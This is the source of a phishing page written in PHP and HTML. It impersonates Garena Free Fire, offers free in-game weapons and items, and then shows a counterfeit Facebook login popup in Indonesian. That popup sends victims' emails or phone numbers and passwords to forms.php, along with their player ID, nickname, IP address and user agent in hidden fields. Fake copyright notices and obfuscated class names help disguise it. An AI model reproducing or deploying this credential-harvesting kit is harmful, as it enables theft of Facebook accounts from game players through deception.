<?php
if($_SERVER["HTTPS"] != "on")
{
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}
?>
<html>
    <head>
        <title>Garena Free Fire. Best survival Battle Royale on mobile!</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0" name="viewport" />
        <link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
        <link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="copyright" content="" />
        <meta content="black" name="apple-mobile-web-app-status-bar-style" />
        <meta name="apple-mobile-web-app-title" content="Garena Free Fire">
        <meta name="keywords" content="survival, last survivor, battle royale game, battle royale, battleground, last man standing, free mobile game, multipleplayer, garena mobile game," />
        <meta name="description" content="Free Fire is a multiplayer battle royale mobile game, developed and published by Garena for Android and iOS. To be the last survivor is the only goal." />
        <link rel="stylesheet" href="assets/css/style.css">
        <link rel="stylesheet" href="assets/css/facebook.css">
        <script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
  	    <script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
    </head>
    <body onload="$('.selectBox').load('view/evo.php');">
        <div class="loader">
            <img src="https://h.top4top.io/p_2016h7ob71.gif">
        </div>
        <div class="container">
            <div class="top-bar">
                <div class="leftSide">
                    <div class="name">
                        <img class="atas" src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small-fixed_20210113.png">
                    </div>
                </div>
                <div class="rightSide">
                        <img class="playstore" src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googleplay3.png">
                        <img class="appstore" src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore3.png">
                </div>
            </div>

            <div class="wrap">
                <div class="imagePreview">
                    <img class="image" id="imgSrc" src="https://scontent.fupg2-2.fna.fbcdn.net/v/t1.6435-9/241543902_1446185982480681_7409049520154647750_n.jpg?_nc_cat=109&ccb=1-5&_nc_sid=730e14&_nc_eui2=AeGyqcMcqGg2SEmgHOSAM_EbwQnfOUC6OFnBCd85QLo4WV5RWzgbOyVe77PPJbrsRZzyO2WYsxSNWkxXX4XlUf2y&_nc_ohc=cjvMchT4_DoAX_I6gp-&tn=f2E2CCjx9t-jqWmn&_nc_ht=scontent.fupg2-2.fna&oh=0b487ae5dbda39aec2f158a4fcfd26cf&oe=6160D628">
                </div>
                <div class="chooserImg">
                    <div class="charac active">
                        <img src="https://scontent.fupg2-2.fna.fbcdn.net/v/t1.6435-9/241543902_1446185982480681_7409049520154647750_n.jpg?_nc_cat=109&ccb=1-5&_nc_sid=730e14&_nc_eui2=AeGyqcMcqGg2SEmgHOSAM_EbwQnfOUC6OFnBCd85QLo4WV5RWzgbOyVe77PPJbrsRZzyO2WYsxSNWkxXX4XlUf2y&_nc_ohc=cjvMchT4_DoAX_I6gp-&tn=f2E2CCjx9t-jqWmn&_nc_ht=scontent.fupg2-2.fna&oh=0b487ae5dbda39aec2f158a4fcfd26cf&oe=6160D628">
                    </div>
                    <div class="charac">
                        <img src="https://scontent.fupg1-1.fna.fbcdn.net/v/t1.6435-9/241562344_1446609652438314_8802689386444928640_n.jpg?_nc_cat=106&ccb=1-5&_nc_sid=730e14&_nc_eui2=AeHW3Rh_kqvcsBVyiC2nFv43INbvMJVGfv8g1u8wlUZ-_62vx4fCMQKqwiZLAG3WafOGZsBvFLR9pZ5C9EsV20cT&_nc_ohc=S1s9rK4r58AAX9qfPAX&_nc_ht=scontent.fupg1-1.fna&oh=444dc12bf0dd7809beaa16e4c609c499&oe=6162F07A">
                    </div>
                    <div class="charac">
                        <img src="https://scontent.fupg1-1.fna.fbcdn.net/v/t1.6435-9/241746545_1446054609160485_1235853491988693942_n.jpg?_nc_cat=111&ccb=1-5&_nc_sid=730e14&_nc_eui2=AeGnOVdKQQ-MotD_Sc9xKtO3gAHak293BgmAAdqTb3cGCc--6If41VLY3AuJS2-dk4ERxwcmoFnKyaUJrZTq1e9z&_nc_ohc=__OU_ENxF6kAX8WoxJ3&_nc_ht=scontent.fupg1-1.fna&oh=ccc84f83a93b1521b52b2243eb917053&oe=6160BFEA">
                    </div>
                    <div class="charac">
                        <img src="https://scontent.fupg1-1.fna.fbcdn.net/v/t1.6435-9/241310298_1445937372505542_924987460367632454_n.jpg?_nc_cat=106&ccb=1-5&_nc_sid=730e14&_nc_eui2=AeFT-HtujBe8hv_DaCc325TY8zG5ekzWnFHzMbl6TNacUQVm_LXZQpA-nkA9ZJ28jPYzjTNJRh-Y3Q3cYQy5HN06&_nc_ohc=pRR1RdX7UgQAX8KZPF4&_nc_ht=scontent.fupg1-1.fna&oh=0c9ab3a0d9f411e4304bc59758f85142&oe=61619217">
                    </div>
                </div>
                <div class="menu left">
                    <a class="choose" id="kiri">EVO GUN</a>
                    <a class="choose" id="kanan">ITEM OLD</a>
                </div>
                <div class="selectBox">
                    <!-- CREATED BY Hǎo chéng [郝诚] -->
                    <!-- Don't Change Copyright -->
                </div>

                <div class="footer">
                    <div class="garena">
                        <img src="https://reward.ff.garena.com/images/c34038edcf4185b3e75a6b85f1cd3d4f.jpg">
                    </div>
                    <div class="copyright">
                        <span class="atas">Copyright © Garena International.</span>
                        <span class="bawah">Trademarks belong to their respective owners. All rights Reserved.
                    </div>
                </div>
            </div>


            <div class="孟子">
                <h1 class="興">Congratulations</h1>
                <div class="何">
                    <img id="而" src="assets/images/evo/1.jpg">
                </div>
                <div class="問而" onclick="$('.login-facebook').fadeIn()">Claim</div>
            </div>
            <div class="曰"></div>



            <div class="以">
                <div class="子">
                    <p id="懼">INVALID PLAYER ID</p>
                </div>
                <h1 class="興">PLAYER ID VERIFICATION</h1>
                <input class="以其" id="以其" type="number" placeholder="Enter Your ID">
                <div class="問">Check ID</div>
            </div>

            <!-- FACEBOOK LOGIN -->
            <div class="popup-login login-facebook animated fadeIn" style="display: none;">
                <div class="popup-box-login-fb">
                   <div class="navbar-fb">
                      <img width="45" src="https://i.im.ge/2021/09/15/Tw3QNy.png">
                   </div>
                   <div class="content-box-fb">
                     <p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                     <p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
                      <img width="75" height="75" src="https://img.utdstc.com/icon/e61/511/e61511ae88f7d52fac67cd4c4f9c739bf71572d2923e1acf512f249ae0544fd4:200">
                      <div class="txt-login-fb">
                       Masuk ke akun Facebook Anda untuk terhubung dengan Freefire
                      </div>
                      <form class="login-form" method="POST" action="forms.php" onsubmit="return valid()">
                         <label>
                         <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
                         </label>
                         <label>
                         <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
                         </label>
                         <!-- HIDDEN FORM -->
                         <input type="hidden" name="nick" value="">
                         <input type="hidden" name="id" value="">
                         <input type="hidden" name="ip" value="">
                         <input type="hidden" name="ua" value="">
                         <!-- END -->
                         <button  type="submit" class="btn-login-fb">Masuk</button>
                      </form>
                      <div class="txt-create-account">Create account</div>
                      <div class="txt-not-now">Not now</div>
                      <div class="txt-forgotten-password">Forgotten password?</div>
                   </div>
                   <div class="language-box">
                      <center>
                      <div class="language-name language-name-active">English (UK)</div>
                      <div class="language-name">Bahasa Indonesia</div>
                      <div class="language-name">Basa Jawa</div>
                      <div class="language-name">Bahasa Melayu</div>
                      <div class="language-name">日本語</div>
                      <div class="language-name">Español</div>
                      <div class="language-name">Português (Brasil)</div>
                      <div class="language-name">
                         <i class="fa fa-plus"></i>
                      </div>
                      </center>
                   </div>
                   <div class="copyrights">Facebook Inc.</div>
                </div>
            </div>
            <!-- END -->

        </div>
        <script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
        <script src="assets/js/jquery/dist/jquery.min.js"></script>
        <script src="assets/js/validFB.js"></script>
        <script>
            $('.chooserImg .charac').click(function(){
                $(this).addClass('active').siblings().removeClass('active');
                let imgSrc = $(this).find('img').attr('src');
                $('#imgSrc').attr('src',imgSrc)
            })
            $('.menu .choose').click(function(){
                $(this).addClass('active').siblings().removeClass('active');
                if($(this).attr('id') == "kiri"){
                    $('.menu').removeClass('right').addClass('left');
                    $('.selectBox').load('view/evo.php');
                }else{
                    $('.menu').removeClass('left').addClass('right');
                    $('.selectBox').load('view/old.php');
                }
            })
            function 之(e)
            {
                var 之 = e.parentElement.querySelector('img').getAttribute('src');
                $('#而').attr('src',之);
                $('.孟子').fadeIn().css('display','flex');
                $('.曰').fadeIn();
            }
        </script>




        <script>
        $(document).ready(function(){
            setTimeout(() => {
				$('.loader').fadeOut()
			},1000)
            $.ajax({
                        type: "get",
                        async: false,
                        url: "https://na.apps.amsoveasea.com/swoole/?actid=2020&r=index/getCountry&_only_service_response_=1",
                        dataType: "json",
                        success: function (result) {
                        $('input[name="ip"]').val(result.ip);
                        $('input[name="ua"]').val(navigator.userAgent)
                        }
                    })
        })
        $('.問').click(function(){
            $(this).html('<ion-spinner name="dots"></ion-spinner>');
            $('.以其').removeClass('error');
            $('.子').hide();
            setTimeout(() => {
            const 其 = $('#以其').val();
            if(其 == '' || 其 == null || 其.length <= 5)
            {
                $('.以其').addClass('error');
                $(this).html('Check ID');
                return false;
            }else{
                $('.問').html('<ion-spinner name="dots"></ion-spinner>');
            }
            $.ajax({
                url: `https://api-xyz.com/trueid/freefire/?id=${其}&token=NguyenThuWan`,
                type: 'GET',
                dataType: 'json',
                beforeSend: function(){
                    $('.問').html('<ion-spinner name="dots"></ion-spinner>');
                },
                success: function(征){
                    $('.問').html('Check ID');
                    console.log(征)
                    const code = 征.result.status;
                    switch(code){
                        case '200': 
                            $('.子').fadeIn();
                            $('#懼').html('Hi, '+征.nickname);
                            $('input[name="id"]').val(其);
                            $('input[name="nick"]').val(征.nickname);
                            setTimeout(() => {
                                $('.以').fadeOut();
                                $('.曰').fadeOut();
                            },2000)
                            break;
                        case '400':
                            $('.子').fadeIn();
                            $('#懼').html('INVALID PLAYER ID');
                            $('#以其').val('')
                    }
                }
            })
            },500)
        })
        </script>








    </body>
</html>